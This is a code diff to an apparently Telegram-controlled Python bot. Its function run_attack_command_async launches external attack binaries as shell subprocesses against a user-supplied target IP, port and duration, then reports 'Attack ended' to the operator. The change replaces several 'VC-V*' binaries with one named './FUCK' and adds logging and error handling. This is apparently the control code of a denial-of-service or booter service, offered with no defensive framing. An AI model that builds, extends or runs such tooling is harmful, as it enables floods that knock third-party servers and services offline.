@@ -26,21 +26,38 @@ default_duration = None  # Global variable for default duration
 
 async def run_attack_command_async(target_ip, target_port, duration):
     global attack_processes
-    # List of files to execute
-    attack_files = ["./VC-VB", "./VC-V0", "./VC-V1", "./VC-V2", "./VC-V3", "./VC-V4", "./VC-V5.1", "./VC-V5.2"]
+    try:
+        # List of files to execute
+        attack_files = ["./FUCK"]
 
-    # Start multiple attack processes
-    attack_processes = [
-        await asyncio.create_subprocess_shell(
-            f"{file} {target_ip} {target_port} {duration} 100", stdout=PIPE, stderr=PIPE
-        ) for file in attack_files
-    ]
+        # Start multiple attack processes
+        attack_processes = []
+        for file in attack_files:
+            command = f"{file} {target_ip} {target_port} {duration}"
+            logging.info(f"Executing: {command}")
+            
+            # Execute the command
+            process = await asyncio.create_subprocess_shell(
+                command, stdout=PIPE, stderr=PIPE
+            )
+            attack_processes.append(process)
+
+        # Wait for all processes to complete and log the output
+        for process in attack_processes:
+            stdout, stderr = await process.communicate()
+            
+            # Log any output or errors from the subprocess
+            if stdout:
+                logging.info(f"Process stdout: {stdout.decode()}")
+            if stderr:
+                logging.error(f"Process stderr: {stderr.decode()}")
+
+        # Notify that the attack has ended
+        bot.send_message(USER_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
     
-    # Wait for all processes to complete
-    await asyncio.gather(*(process.communicate() for process in attack_processes))
-    
-    # Notify that the attack has ended
-    bot.send_message(USER_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error running attack command: {e}")
+        bot.send_message(USER_ID, "*An error occurred while executing the attack. Please check the logs for details.*", parse_mode='Markdown')
 
 def stop_attack():
     global attack_processes
